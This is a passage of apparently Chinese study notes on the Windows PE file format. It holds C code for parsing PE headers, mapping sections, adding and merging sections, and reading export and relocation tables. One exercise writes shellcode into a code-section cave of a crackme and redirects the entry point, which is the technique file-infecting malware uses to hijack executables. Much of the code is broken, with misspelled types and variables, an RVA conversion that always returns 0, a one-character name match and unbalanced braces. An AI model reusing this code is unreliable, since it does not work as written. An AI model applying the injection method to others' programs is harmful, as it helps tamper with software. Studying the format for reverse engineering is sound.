pTempFileBuffer = NULL; //open pFile = fopen(lpszFile,\"rb\"); if(!pFile) { return 0; } //size fseek(pFile,0,SEEK_END); fileSize = ftell(pFile); fseek(pFile,0,SEEK_SET); //malloc pTempFileBuffer = malloc(fileSize); if(!pTempFileBuffer) { fclose(pFile); return 0; } //read memory size_t n = fread(pTempFileBuffer,fileSize,1,pFile); if(!n) { free(pTempFileBuffer); fclose(pFile); return 0; } //succeed close file *pFileBuffer = pTempFileBuffer; pTempFileBuffer = NULL; fclose(pFile); return fileSize; } DWORD CopyFileBufferToImageBuffer(IN LPVOID pFileBuffer,OUT LPVOID* pImageBuffer) { PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTIOM_HEADER pSectionHeader = NULL; LPVOID pTempImageBuffer = NULL; if(pFileBuffer == NULL) { return 0; } if(*((PWORD)pFileBuffer)!= IMAGE_DOS_SIGNATURE) { return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; if(*((PDWORD)((DOWRD)pFileBuffer+pDosHeader -\u003e e_lfanew)) != IMAGE_NT_SIGNATURE) { return 0; } //NT pNTHeader = (PIMAGE_NT_HEADER)((DWORD)pFileBuffer+pDosHeader -\u003e e_lfanew); //PE pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader)+4); //OPT PE pOptionHeader = (PIMAGE_OPTION_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER); //SEC HEADER pSectionHeader = (PIMAGE_SECTIOM_HEADER)((DWORD)pOptionHeader + pPEHeader-\u003eSizeOfOptionalHeader); pTempImageBuffer = malloc(pOptionHeader-\u003eSizeOfImage); if (!pTempImageBuffer) { return 0; } memset(pTempImageBuffer,0,pOptionHeader-\u003eSizeOfImage); memcpy(pTempImageBuffer,pDosHeader,pOptionHeader-\u003eSizeOfheHeaders); PIMAGE_SECTION_HEADER pTempSectionHeader = pSectionHeader; for(int i=0;i\u003cpPEHeader-\u003eNumberOfSections;i++,pTempSectionHeader++) { memcpy((void*)((DWORD)pTempImageBuffer+pTempSectionHeader-\u003eVirtualAddress),(void*)((DWORD)pFileBuffer+pTempSectionHeader-\u003ePointerToRawData),pTempSectionHeader-\u003eSizeOfRawData); } *pImageBuffer=pTempImageBuffer; pTempImageBuffer=NULL; return pOptionHeader-\u003eSizeOfImage; } BOOL MemeryTOFile(IN LPVOID pMemBuffer,IN size_t size,OUT LPSTR lpszFile) { FILE* fp = NULL; fp = fopen(lpFile,\"wb+\"); if(!fp) { return FALSE; } fwrite(pMemBuffer,size,1,fp); fclose(fp); fp = NULL; return TRUE; } DWORD RvaToFileOffset(IN LPVOID pFileBuffer,IN DWORD dwRva) { DWORD dwFOAValue = 0; PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; if(!pFileBuffer) { return dwFOValue; } if(*((PWORD)pFileBuffer)!=IMAGE_DOS_SIGNATURE) { return dwFOValue; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer+pDosHeader-\u003ee_lfanew); pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + 4); pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader+IMAGE_SIZEOF_FILE_HEADER); return 0; } 解释：\nfseek通过使用二进制的方式打开文件，移动文件读写指针的位置，在stdio.h头文件里\nint fseek(FILE * stream, long offset, int fromwhere);\n上面是fseek的函数原型 第一个参数stream为文件指针 第二个参数offset为偏移量，整数表示正向偏移，负数表示负向偏移 第三个参数fromwhere为指针的起始位置,设定从文件的哪里开始偏移,可能取值为：SEEK_CUR，SEEK_END，SEEK_SET SEEK_SET 0 文件开头 SEEK_CUR 1 当前读写的位置 SEEK_END 2 文件尾部\nftell()用于返回文件当前指针指向的位置，与fseek配合可以算出文件元素数据总数。\nftell()函数用来获取文件读写指针的当前位置，其原型为：long ftell(FILE * stream); 同样在stdio.h头文件里\nvoid* malloc (size_t size); size_t —\u003e typedef unsigned int size_t；无符号整型别名是size_t void* —\u003e 函数的返回值类型是void*；void并不是说没有返回值或者返回空指针，而是返回的指针类型未知; 所以在使用malloc()时通常需要进行强制类型转换，将 void 指针转换成我们希望的类型; 例如：char *ptr = (char *)malloc(10); //分配10个字节的内存空间，用来存放字符 参数说明 —\u003e size 为需要分配的内存空间的大小，以字节（Byte）计。 函数说明 —\u003e malloc()在堆区分配一块指定大小的内存空间，用来存放数据。这块内存空间在函数执行完成后不会被初始化; 它们的值是未知的，所以分配完成内存之后需要初始化； 返回值:分配成功返回指向该内存的地址，失败则返回NULL。\nLPVOID —-\u003e typedef void far *LPVOID；在WINDEF.H头文件里面；别名的void指针类型\nPIMAGE_DOS_HEADER —\u003e 指向结构体，别名为这两个IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER PIMAGE_NT_HEADERS —\u003e 指向结构体，typedef PIMAGE_NT_HEADERS32 PIMAGE_NT_HEADERS; PIMAGE_FILE_HEADER —\u003e 指向结构体，别名为这两个IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; PIMAGE_OPTIONAL_HEADER32 —\u003e 指向结构体，别名为这两个 IMAGE_OPTIONAL_HEADER32，*PIMAGE_OPTIONAL_HEADER32; PIMAGE_SECTION_HEADER —\u003e 指向结构体，别名为这两个IMAGE_SECTION_HEADER，*PIMAGE_SECTION_HEADER;\nIMAGE_DOS_SIGNATURE这个在头文件WINNT.H里面，对应是个无参数宏； #define IMAGE_DOS_SIGNATURE 0x5A4D // MZ 在宏扩展的时候就会替换为0x5A4D，然后根据架构的不同进行排序存储，分大端和小端模式； 使用上面方式进行比对是否是有效的MZ头是非常有效； 而且IMAGE_DOS_SIGNATURE存储的值是两个字节，刚好就是PWORD —\u003e typedef WORD near *PWORD； 所以在进行比较的时候需要强制类型转换为相同的类型进行比较\nIMAGE_NT_SIGNATURE —\u003e #define IMAGE_NT_SIGNATURE 0x00004550 // PE00 上述同样是个宏扩展，在头文件WINNT.H里面； 在进行比对的时候因为在Dos头里面有个值是e_lfanew对应的时候DWORD类型，所以在进行指针相加的时候 需要先进行强制类型转换，然后相加，即移动指针位置；然后最终需要比对的结果是0x4550站两个字节 所以又要强制转换类型为PWORD；\nIMAGE_SIZEOF_FILE_HEADER也是个宏扩展，里面字节描述了PE文件头的大小是20个字节； #define IMAGE_SIZEOF_FILE_HEADER 20，所以只要在PE文件头的首地址偏移20个字节即可移动到可选PE头； 指针相加的时候，此处的类型依然是DWORD\n到了节表的首地址位置之后，因为需要将FileBuffer复制到ImageBuffer，这个过程中，节表之前的Dos头，NT头 PE文件头，可选PE头，它们的大小都是不变的，所以定位出来之后，到后面的操作中直接复制即可，而节表不一样 它在FileBuffer状态和ImageBuffer状态是不相同的，它们节表之间复制转换到ImageBuffer是需要拉长节表，所以 在操作的时候是需要确定FileBuffer到ImageBuffer之后ImageBuffer的大小是多少，而这个大小，已经在可选PE头 里面的某一个值中已经给出来了 —\u003e SizeOfImage ;\nvoid* memset( void* ptr,int value,size_t num ); memset()函数用来将指定内存的前n个字节设置为特定的值;\n参数说明： ptr：为要操作的内存的指针; value：为要设置的值;既可以向value传递int类型的值,也可以传递char类型的值，int和char可以根据ASCII码相互转换; num：为ptr的前num个字节，size_t就是unsigned int。 函数说明：memset()会将ptr所指的内存区域的前num个字节的值都设置为value，然后返回指向ptr的指针；\nvoid* memcpy (void* dest,const void* src,size_t num); memcpy()函数功能用来复制内存的；她会复制src所指向内容的首地址，作为起始位置，然后偏移num个字节到dest所指的内存地址 的位置；此函数有个特征就是，她并不关心被复制的数据类型，只是逐字节地进行复制，这给函数的使用带来了很大的灵活性， 可以面向任何数据类型进行复制；\n需要注意的是： dest指针要分配足够的空间，也就是要大于等于num字节的空间，如果没有分配足够的空间会出现错误； dest和src所指的内存空间不能重叠（如果发生了重叠，使用memmove()会更加安全）。\n代码节空白区添加代码 在代码空白区添加代码（手动）\n我找的这个程序是之前的那个crackme，由于文件对齐和内存对齐不一样，所以要算一下。CODE节开头在文件中是600h，在内存中是1000h，换算关系为：内存地址 = 文件地址 - 600 + 1000。防止头晕所以全部转为内存地址计算就可以了，视频中说的那个MessageboxA地址就直接用CODE节那里面的函数地址是CODE:0040143A。加到第一个节的文件中的B90位置，仔细算一下要跳的地址就行，一定要按小端序来写：\n6A 00 6A 00 6A 00 6A 00 E8 9D FE FF FF E9 5E FA FF FF 再将oep改为1590h就好了。\n任意代码空白区添加代码 向代码节添加代码编程实现\nVOID ADDCodeInCodeSec() { LPVOID pFileBuffer = NULL; LPVOID pImageBuffer = NULL; LPVOID pNewBuffer = NULL; PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; PBYTE codeBegin = NULL; BOOL isOK = FALSE; DWORD size = 0; ReadPEFile(FilePath_In,\u0026pFileBuffer); if(!pFileBuffer) { return ; } CopyFileBufferToImageBuffer(pFileBuffer,\u0026pImageBuffer); if(!pFileBuffer) { free(pFileBuffer); return ; } pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer; pOprionHeader = (PIMAGE_OPTIONAL_HEADER32)(((DWORD)pImageBuffer + pDosHeader-\u003ee_lfanew) + 4 + IMAGE_SIZEOF_FILE_HEADER); pSectionHeader = (PIMAGE_SECTION_HEADER)(((DWORD)pImageBuffer + pDosHeader-\u003ee_lfanew) + 4 + IMAGE_SIZEOF_FILE_HEADER + IMAGE_SIZEOF_NT_OPTIONAL32_HEADER); if (((pSectionHeader-\u003eSizeOfRawData) - (pSectionHeader-\u003eMisc.VirtualSize)) \u003c SHELLCODELENGTH) { free(pFileBuffer); free(pImageBuffer); } codeBegin = (PBYTE)((DWORD)pImageBuffer + pSectionHeader-\u003eVirtualAddress + pSectionHeader-\u003eMisc.VirtualSize); printf(\"pSectionHeader-\u003eVirtualAddress: %#010X\\r\\n\", pSectionHeader-\u003eVirtualAddress); printf(\"pSectionHeader-\u003eMisc.VirtualSize: %#010X\\r\\n\", pSectionHeader-\u003eMisc.VirtualSize); printf(\"codeBegin: %#010X\\r\\n\", codeBegin); memcpy(codeBegin,ShellCode,SHELLCODELENGTH); DWORD callAddr = (MESSAGEBOXADDR - (pOptionHeader-\u003eImageBase + ((DWORD)(codeBegin + 0xD) - (DWORD)pImageBuffer))); printf(\"callAddr ---\u003e %#010X \\r\\n\",callAddr); *(PDWORD)(codeBegin + 0x09) = callAddr; printf(\"*(PWORD)(codeBegin + 0x09) ---\u003e %#010X \\r\\n\",*(PDWORD)(codeBegin + 0x09)); DWORD jmpAddr = ((pOptionHeader-\u003eImageBase + pOptionHeader-\u003eAddressOfEntryPoint) - (pOptionHeader-\u003eImageBase + ((DWORD)(codeBegin + SHELLCODELENGTH) - (DWORD)pImageBuffer))); printf(\"jmpAddr ---\u003e %#010X \\r\\n\",jmpAddr); *(PDWORD)(codeBegin + 0x0E) = jmpAddr; printf(\"*(PWORD)(codeBegin + 0x0E) ---\u003e %#010X \\r\\n\",*(PDWORD)(codeBegin + 0x0E)); printf(\"pOptionHeader-\u003eAddressOfEntryPoint ---\u003e %#010X \\r\\n\",pOptionHeader-\u003eAddressOfEntryPoint); printf(\"(DWORD)codeBegin ---\u003e %#010X \\r\\n\",((DWORD)codeBegin - (DWORD)pImageBuffer)); pOptionHeader-\u003eAddressOfEntryPoint = (DWORD)codeBegin - (DWORD)pImageBuffer; printf(\"pOptionHeader-\u003eAddressOfEntryPoint ---\u003e %#010X \\r\\n\",pOptionHeader-\u003eAddressOfEntryPoint); size = CopyImageBufferToNewBuffer(pImageBuffer,\u0026pNewBuffer); if (size == 0 || !pNewBuffer) { free(pFileBuffer); free(pImageBuffer); return ; } isOK = MemeryTOFile(pNewBuffer,size,FilePath_Out); if (isOK) { return ; } free(pFileBuffer); free(pImageBuffer); free(pNewBuffer); } } 向其他节空白区添加代码编程实现\n新增节-添加代码 手动新增一个节表和节，保证修改后的程序能正确执行\n改SizeOfImage 改节的个数 加一个节表，并修正 到文件最后加对应大小的位置 编程实现：新增一个节，并添加代码\nBOOL AddFileBufferToSectionTable(IN LPVOID pFileBuffer,OUT LPVOID* pNewBuffer,IN const char* sectionTable,IN size_t SsectionTableSize) { PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; //NT头 PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-\u003ee_lfanew); //标准PE头 PIMAGE_FILE_HEADER pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + 0x4); //可选PE头 PIMAGE_OPTIONAL_HEADER32 pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER); //节表解析 PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pPEHeader-\u003eSizeOfOptionalHeader); //计算空间是否足够 DWORD whiteSpaceSize = 0; whiteSpaceSize = pNTHeader-\u003eOptionalHeader.SizeOfHeaders - (pDosHeader-\u003ee_lfanew + sizeof(pNTHeader-\u003eSignature) + sizeof(pNTHeader-\u003eFileHeader) + pPEHeader-\u003eSizeOfOptionalHeader + ((pNTHeader-\u003eFileHeader.NumberOfSections + 1) * sizeof(IMAGE_SECTION_HEADER))); if (whiteSpaceSize \u003c sizeof(IMAGE_SECTION_HEADER)) { printf(\"数据缓冲区太小无法添加节表！\"); return false; } //Copy一个新的节表 char* pTmpFile = (char*)pFileBuffer; char* pTmpFileCopy = (char*)pFileBuffer; pTmpFile = pTmpFile + (pDosHeader-\u003ee_lfanew + sizeof(pNTHeader-\u003eSignature) + sizeof(pNTHeader-\u003eFileHeader) + pPEHeader-\u003eSizeOfOptionalHeader); pTmpFileCopy = pTmpFileCopy + (pDosHeader-\u003ee_lfanew + sizeof(pNTHeader-\u003eSignature) + sizeof(pNTHeader-\u003eFileHeader) + pPEHeader-\u003eSizeOfOptionalHeader + ((pNTHeader-\u003eFileHeader.NumberOfSections) * sizeof(IMAGE_SECTION_HEADER))); memcpy(pTmpFileCopy, pTmpFile, sizeof(IMAGE_SECTION_HEADER)); //在新增节后面 填充一个节大小的000 (忽略) //修改PE头中节的数量 pPEHeader-\u003eNumberOfSections = pPEHeader-\u003eNumberOfSections + 1; //修改sizeOfImage的大小 pOptionHeader-\u003eSizeOfImage = pOptionHeader-\u003eSizeOfImage + SsectionTableSize; //再原有数据的最后，新增一个节的数据(内存对齐的整数倍) //使用PE结构计算文件大小 PIMAGE_SECTION_HEADER pTempSectionHeaderTo = pSectionHeader; for (DWORD i = 2; i \u003c pPEHeader-\u003eNumberOfSections; i++) pTempSectionHeaderTo++; DWORD fileSize = pTempSectionHeaderTo-\u003eSizeOfRawData + pTempSectionHeaderTo-\u003ePointerToRawData; //申请File大小空间 *pNewBuffer = (PDWORD)malloc(fileSize + SsectionTableSize); if (!*pNewBuffer) { printf(\"%s\", \"申请ImageBuffer失败！\"); free(*pNewBuffer); return false; } memset(*pNewBuffer, 0, fileSize + SsectionTableSize); //修正节表属性 PIMAGE_SECTION_HEADER pTempSectionHeaderTo2 = (PIMAGE_SECTION_HEADER)pTmpFileCopy; memcpy(pTempSectionHeaderTo2-\u003eName, sectionTable, 4); pTempSectionHeaderTo2-\u003eMisc.VirtualSize = SsectionTableSize; pTempSectionHeaderTo2-\u003eVirtualAddress = pTempSectionHeaderTo-\u003eVirtualAddress + Align(pTempSectionHeaderTo-\u003eMisc.VirtualSize, pNTHeader-\u003eOptionalHeader.SectionAlignment); pTempSectionHeaderTo2-\u003eSizeOfRawData = Align(SsectionTableSize, pNTHeader-\u003eOptionalHeader.FileAlignment); pTempSectionHeaderTo2-\u003ePointerToRawData = pTempSectionHeaderTo-\u003ePointerToRawData + Align(pTempSectionHeaderTo-\u003eSizeOfRawData, pNTHeader-\u003eOptionalHeader.FileAlignment); memcpy(*pNewBuffer, pFileBuffer, fileSize); return true; } 编程实现：扩大最后一个节，并添加代码\n扩大节-合并节-数据目录 扩大最后一个节，保证程序正常运行\n改SizeOfImage 改大SizeOfRawData和VirtualSize 到文件最后加对应大小的位置 将所有节合并，保证程序正常运行\n改节的个数为1\n删去多余节表，并调整剩下这个节的VirtualSize和SizeOfRawData为：\nMax = SizeOfRawData\u003eVirtualSize?SizeOfRawData:VirtualSize\nSizeOfRawData = VirtualSize = 最后一个节的VirtualAddress + Max - SizeOfHeaders内存对齐后的大小\n其实就是所有节对齐后的大小，就是SizeOfImage - SizeOfHeaders，值应该是一样的\n改这一个节的属性为全部属性E0000060\n定义一个函数，能够返回对齐后的大小Align(int x,int y)，y是对齐大小\nint Align(int x, int y) { int i; if (x \u003c= y) { return y; } for (i = 1; i \u003c= x / y; i++) { if (x - y * (i - 1) \u003e 0 \u0026\u0026 x - y * i \u003c= 0) { return y * i; } } return y * i; } 编程输出全部目录项（16个）\nDWORD PrintDriectory(LPVOID pImageBuffer){ //定义PE头的信息 PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; if(!pImageBuffer) { printf(\"error\"); return 0; } //判断是不是exe文件 if(*((PWORD)pImageBuffer) != IMAGE_DOS_SIGNATURE) { printf(\"error\"); return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer; if(*((PDWORD)((BYTE *)pImageBuffer + pDosHeader-\u003ee_lfanew)) != IMAGE_NT_SIGNATURE){ printf(\"error\"); return 0; } //读取pFileBuffer 获取DOS头，PE头，节表等信息 pDosHeader =(PIMAGE_DOS_HEADER)pImageBuffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDosHeader-\u003ee_lfanew); //打印NT头\tpPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + 4); //加4个字节到了标准PE头 pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER); //标准PE头+标准PE头的大小 20 printf(\"===导出表====\\n\"); printf(\"内存地址%x\\n\",pOptionHeader-\u003eDataDirectory[0].VirtualAddress); printf(\"内存大小%x\\n\",pOptionHeader-\u003eDataDirectory[0].Size); printf(\"===导入表====\\n\"); printf(\"内存地址%x\\n\",pOptionHeader-\u003eDataDirectory[1].VirtualAddress); printf(\"内存大小%x\\n\",pOptionHeader-\u003eDataDirectory[1].Size); printf(\"===资源表====\\n\"); printf(\"内存地址%x\\n\",pOptionHeader-\u003eDataDirectory[2].VirtualAddress); printf(\"内存大小%x\\n\",pOptionHeader-\u003eDataDirectory[2].Size); printf(\"===异常信息表====\\n\"); printf(\"内存地址%x\\n\",pOptionHeader-\u003eDataDirectory[3].VirtualAddress); printf(\"内存大小%x\\n\",pOptionHeader-\u003eDataDirectory[3].Size); printf(\"===安全证书表====\\n\"); printf(\"内存地址%x\\n\",pOptionHeader-\u003eDataDirectory[4].VirtualAddress); printf(\"内存大小%x\\n\",pOptionHeader-\u003eDataDirectory[4].Size); printf(\"===重定位表====\\n\"); printf(\"内存地址%x\\n\",pOptionHeader-\u003eDataDirectory[5].VirtualAddress); printf(\"内存大小%x\\n\",pOptionHeader-\u003eDataDirectory[5].Size);\tprintf(\"===调试信息表证书表====\\n\"); printf(\"内存地址%x\\n\",pOptionHeader-\u003eDataDirectory[6].VirtualAddress); printf(\"内存大小%x\\n\",pOptionHeader-\u003eDataDirectory[6].Size); printf(\"===版权所有表====\\n\"); printf(\"内存地址%x\\n\",pOptionHeader-\u003eDataDirectory[7].VirtualAddress); printf(\"内存大小%x\\n\",pOptionHeader-\u003eDataDirectory[7].Size); printf(\"===全局指针表====\\n\"); printf(\"内存地址%x\\n\",pOptionHeader-\u003eDataDirectory[8].VirtualAddress); printf(\"内存大小%x\\n\",pOptionHeader-\u003eDataDirectory[8].Size); printf(\"===TLS表====\\n\"); printf(\"内存地址%x\\n\",pOptionHeader-\u003eDataDirectory[9].VirtualAddress); printf(\"内存大小%x\\n\",pOptionHeader-\u003eDataDirectory[9].Size); printf(\"===加载配置表====\\n\"); printf(\"内存地址%x\\n\",pOptionHeader-\u003eDataDirectory[10].VirtualAddress); printf(\"内存大小%x\\n\",pOptionHeader-\u003eDataDirectory[10].Size); printf(\"===绑定导入表====\\n\"); printf(\"内存地址%x\\n\",pOptionHeader-\u003eDataDirectory[11].VirtualAddress); printf(\"内存大小%x\\n\",pOptionHeader-\u003eDataDirectory[11].Size); printf(\"====IAT表===\\n\"); printf(\"内存地址%x\\n\",pOptionHeader-\u003eDataDirectory[12].VirtualAddress); printf(\"内存大小%x\\n\",pOptionHeader-\u003eDataDirectory[12].Size); printf(\"====延迟导入===\\n\"); printf(\"内存地址%x\\n\",pOptionHeader-\u003eDataDirectory[13].VirtualAddress); printf(\"内存大小%x\\n\",pOptionHeader-\u003eDataDirectory[13].Size); printf(\"====COM===\\n\"); printf(\"内存地址%x\\n\",pOptionHeader-\u003eDataDirectory[14].VirtualAddress); printf(\"内存大小%x\\n\",pOptionHeader-\u003eDataDirectory[14].Size); printf(\"====保留===\\n\"); printf(\"内存地址%x\\n\",pOptionHeader-\u003eDataDirectory[15].VirtualAddress); printf(\"内存大小%x\\n\",pOptionHeader-\u003eDataDirectory[15].Size); return 1; } 静态链接库-动态链接库 创建一个静态链接库，并在代码中使用\n完成，注意名称相同\n创建一个动态链接库，使用两种方式进行导出(_declspec(dllexport)与.def文件)\n完成\n分别使用隐式链接和显示链接使用一个DLL文件\n完成，注意显示链接要包含windows.h头文件\n导出表 编写程序打印所有的导出表信息\nDWORD PrintExport(LPVOID pFileBuffer){ //定义PE头的信息 PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; if(!pFileBuffer) { printf(\"error\"); return 0; } //判断是不是exe文件 if(*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE) { printf(\"error\"); return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; if(*((PDWORD)((BYTE *)pFileBuffer + pDosHeader-\u003ee_lfanew)) != IMAGE_NT_SIGNATURE){ printf(\"error\"); return 0; } //读取pFileBuffer 获取DOS头，PE头，节表等信息 pDosHeader =(PIMAGE_DOS_HEADER)pFileBuffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-\u003ee_lfanew); //打印NT头\tpPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + 4); //加4个字节到了标准PE头 pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER); //标准PE头+标准PE头的大小 20 printf(\"===导出表====\\n\"); printf(\"内存地址%x\\n\",pOptionHeader-\u003eDataDirectory[0].VirtualAddress); printf(\"内存大小%x\\n\",pOptionHeader-\u003eDataDirectory[0].Size); printf(\"===结构===\\n\"); PIMAGE_EXPORT_DIRECTORY Export_Directory = (PIMAGE_EXPORT_DIRECTORY)((char*)pFileBuffer + RvaToFileOffset(pFileBuffer,pOptionHeader-\u003eDataDirectory[0].VirtualAddress)); printf(\"Name:%s\\n\",(char*)pFileBuffer + RvaToFileOffset(pFileBuffer,Export_Directory-\u003eName)); printf(\"Base:%x\\n\",Export_Directory-\u003eBase); printf(\"NumberOfFunctions:%x\\n\",Export_Directory-\u003eNumberOfFunctions); printf(\"NumberOfNames:%x\\n\",Export_Directory-\u003eNumberOfNames); printf(\"AddressOfFunctions: %x\\n\", Export_Directory-\u003e AddressOfFunctions); printf(\"AddressOfNames;: %x\\n\", Export_Directory-\u003e AddressOfNames); printf(\"AddressOfNameOrdinals;: %x\\n\\n\", Export_Directory-\u003e AddressOfNameOrdinals); return 1; } GetFunctionAddrByName(FileBuffer指针，函数名指针)\nDWORD GetFunctionAddrByName(PVOID pFileBuffer,char* FuncName){ PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; if(!pFileBuffer) { printf(\"error\"); return 0; } if(*((PWORD)pFileBuffer)!=IMAGE_DOS_SIGNATURE) { printf(\"error\"); return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; if(*((PWORD)((BYTE *)pFileBUffer+pDosHesder-\u003ee_lfanew)) !=IMAGE_NT_SIGNATURE){ printf(\"error\"); return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBUffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBUffer + pDosHeader-\u003ee_lfanew); pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader)+4); PIMAGE_EXPORT_DIRECTORY Export_Directory = (PIMAGE_EXPORT_DIRECTORY)((char*)pFileBuffer + RvaToFileOffset(pFileBuffer,pOptionHeader-\u003eDataDirectory[0].VirtualAddress)); DWORD* AddressOfNamesFunctionsAddress = (DWORD*)((char*)pFileBuffer + RvaToFileOffset(pFileBuffer,Export_Directory-\u003eAddressOfNames)); WORD* AddressOfNameOrdinalsAddress =(WORD*)((DWORD)pFileBuffer + RvaToFileOffset(pFileBuffer,Export_Directory-\u003eAddressOfNameOrdinals)); DWORD* AddressOfFunctionsAddress = (DWORD*)((char*)pFileBuffer + RvaToFileOffset(pFileBuffer,Export_Directory-\u003eAddressOfFunctions)); for(int x =0;x\u003cExport_Directory-\u003eNumberOfNames;x++,AddressOfNamesFunctionsAddress++) { if (*FuncName == *((char*)pFileBuffer+RvaToFileOffset(pFileBuffer,*AddressOfNamesFunctionsAddress))) { printf(\"函数地址:%x\\n\",AddressOfFunctionsAddress[AddressOfNameOrdinalsAddress[x]]); } } GetFunctionAddrByOrdinals(FileBuffer指针，函数名导出序号)\nDWORD GetFunctionAddrByOrdinals(LPVOID pFileBuffer,DWORD FunctionOrdinals){ PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; if(!pFileBuffer) { printf(\"error\"); return 0; } //判断是不是exe文件 if(*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE) { printf(\"error\"); return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; if(*((PDWORD)((BYTE *)pFileBuffer + pDosHeader-\u003ee_lfanew)) != IMAGE_NT_SIGNATURE){ printf(\"error\"); return 0; } //读取pFileBuffer 获取DOS头，PE头，节表等信息 pDosHeader =(PIMAGE_DOS_HEADER)pFileBuffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-\u003ee_lfanew); //打印NT头\tpPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + 4); //加4个字节到了标准PE头 pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER); //标准PE头+标准PE头的大小 20 // PIMAGE_EXPORT_DIRECTORY Export_Directory = (PIMAGE_EXPORT_DIRECTORY)((char*)pFileBuffer + RvaToFileOffset(pFileBuffer,pOptionHeader-\u003eDataDirectory[0].VirtualAddress)); DWORD* AddressOfNamesFunctionsAddress = (DWORD*)((char*)pFileBuffer + RvaToFileOffset(pFileBuffer,Export_Directory-\u003eAddressOfNames)); printf(\"函数地址为：%x\\n\",AddressOfNamesFunctionsAddress[FunctionOrdinals-Export_Directory-\u003eBase]); } 重定位表 打印所有重定位信息\nDWORD PrintRelocation(LPVOID pFileBuffer){ PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; if(!pFileBuffer) { printf(\"读取到内存的pfilebuffer无效！\\n\"); return 0; } if(*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE) { printf(\"不含MZ标志，不是exe文件！\\n\"); return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; if(*((PDWORD)((BYTE *)pFileBuffer + pDosHeader-\u003ee_lfanew)) != IMAGE_NT_SIGNATURE){ printf(\"无有效的PE标志\\n\"); return 0; } pDosHeader =(PIMAGE_DOS_HEADER)pFileBuffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-\u003ee_lfanew); pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + 4); pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER); if(pOptionHeader-\u003eDataDirectory[5].VirtualAddress == 0){ 